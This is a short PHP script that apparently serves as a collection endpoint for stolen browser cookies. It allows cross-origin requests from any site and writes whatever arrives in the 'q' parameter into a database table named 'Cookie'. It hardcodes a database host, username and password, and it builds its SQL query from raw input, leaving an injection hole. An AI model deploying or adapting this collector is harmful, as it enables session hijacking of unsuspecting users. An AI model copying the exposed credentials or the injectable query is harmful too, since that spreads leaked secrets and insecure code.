<?php
header('Access-Control-Allow-Origin: *');  
$servername = "fdb24.awardspace.net";
$username = "2900176_xyzddostxx";
$password = "Vanan1998tk";
$dbname = "2900176_xyzddostxx";
$port = "3306";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname,$port);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$sql = 'INSERT INTO Cookie (datacookie)
VALUES ("'.$_REQUEST["q"].'")';

if (mysqli_query($conn, $sql)) {
} else {
}
mysqli_close($conn);
?>